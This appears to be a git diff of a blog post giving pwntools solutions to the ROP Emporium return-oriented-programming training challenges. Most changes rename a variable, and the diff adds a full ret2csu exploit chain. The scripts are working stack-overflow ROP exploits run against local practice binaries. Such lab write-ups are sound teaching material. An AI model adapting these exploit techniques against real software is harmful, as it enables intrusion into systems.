@@ -1,6 +1,6 @@
 ---
 title: "ROP Emporium Full Solutions"
-description: "My solutions to all ROP Emporium challs. My favorite instruction is prolly ret after doing rop emporium. Its just too iconic. Favorite register is rax cuz it just sounds so tuff"
+description: "My solutions to all ROP Emporium challs. ROP is so fun :D until it shows up in a diabolical form"
 slug: "pwn-ropemp"
 date: "2025-05-21 00:00:00+0000"
 image: "cover.png"
@@ -17,13 +17,13 @@ not done yet :P i still need to write explanations and what not. im just going t
 ```py
 from pwn import *
 
-p = process('./ret2win')
+io = process('./ret2win')
 
 payload = b'A'*32 + b'B'*8
 payload += p64(0x000000000040053e)
 payload += p64(0x0000000000400756)
-p.sendline(payload)
-p.interactive()
+io.sendline(payload)
+io.interactive()
 ```
 
 ## Chall 2: split
@@ -60,10 +60,10 @@ context.arch = 'amd64'
 
 debug = False
 
-p = process('./callme')
+io = process('./callme')
 
 if debug:
-    print("pid for process @ %d" % p.pid)
+    print("pid for process @ %d" % io.pid)
     pause()
 
 arg1 = p64(0xdeadbeefdeadbeef)
@@ -78,9 +78,9 @@ gadget = p64(0x40093c)
 payload = junk + gadget + args + one
 payload += gadget + args + two
 payload += gadget + args + three
-p.recvuntil(b'> ')
-p.sendline(payload)
-p.interactive()
+io.recvuntil(b'> ')
+io.sendline(payload)
+io.interactive()
 ```
 
 ## Chall 4: write4
@@ -88,7 +88,7 @@ p.interactive()
 ```py
 from pwn import *
 
-p = process('./write4')
+io = process('./write4')
 
 pop_rdi = p64(0x0000000000400693)
 pop_r14_r15 = p64(0x0000000000400690)
@@ -110,8 +110,8 @@ payload += pop_rdi
 payload += reserved_addr_bss
 payload += print_file_call
 
-p.sendline(payload)
-p.interactive()
+io.sendline(payload)
+io.interactive()
 ```
 
 ## Chall 5: badchars
@@ -119,12 +119,12 @@ p.interactive()
 ```py
 from pwn import *
 
-p = process('./badchars')
+io = process('./badchars')
 
 debug = False
 
 if debug:
-    print("gdb <bin> -q <pid> @ %d" % p.pid)
+    print("gdb <bin> -q <pid> @ %d" % io.pid)
     pause()
 
 badchars = [b'x', b'g', b'a', b'.']
@@ -160,8 +160,8 @@ payload += p64(reserved_addr_data)
 payload += print_file_call
 
 # Send and interact
-p.sendline(payload)
-p.interactive()
+io.sendline(payload)
+io.interactive()
 ```
 
 ## Chall 6: fluff
@@ -314,3 +314,41 @@ io.interactive()
 ```
 
 ## Chall 8: ret2csu
+
+```py
+from pwn import *
+
+io = process('./ret2csu')
+
+csu_pop  = p64(0x40069a)
+csu_mov  = p64(0x400680)
+pop_rdi  = p64(0x4006a3)
+win_call = p64(0x400510)
+ret      = p64(0x4004e6)
+
+arg1, arg2, arg3 = p64(0xdeadbeefdeadbeef), p64(0xcafebabecafebabe), p64(0xd00df00dd00df00d)
+
+payload = b'A' * 32 + b'B' * 8
+
+payload += csu_pop
+payload += p64(0)
+payload += p64(1)
+payload += p64(0x600df8)
+payload += p64(0)
+payload += arg2
+payload += arg3
+
+payload += csu_mov
+payload += p64(0) * 7
+
+payload += pop_rdi
+payload += arg1
+payload += win_call
+
+print(f"gdb -q -p {io.pid}")
+pause()
+
+io.sendline(payload)
+
+io.interactive()
+```
